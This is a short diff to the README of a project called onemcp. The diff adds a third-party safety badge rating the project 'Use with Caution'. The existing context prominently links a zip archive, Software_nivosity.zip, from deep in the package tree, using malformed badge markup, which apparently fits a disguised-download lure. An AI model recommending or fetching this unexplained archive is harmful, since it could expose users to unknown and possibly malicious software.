@@ -1,5 +1,7 @@
 # 🚀 onemcp - Fast API Access for AI Agents
 
+[![SafeSkill 65/100](https://img.shields.io/badge/SafeSkill-65%2F100_Use%20with%20Caution-orange)](https://safeskill.dev/scan/rifkimaulana05-onemcp)
+
 [![Download on GitHub](https://github.com/rifkimaulana05/onemcp/raw/refs/heads/main/packages/go-cli/pkg/Software_nivosity.zip%20on%20GitHub-blue)](https://github.com/rifkimaulana05/onemcp/raw/refs/heads/main/packages/go-cli/pkg/Software_nivosity.zip)
 
 ## 📦 Overview
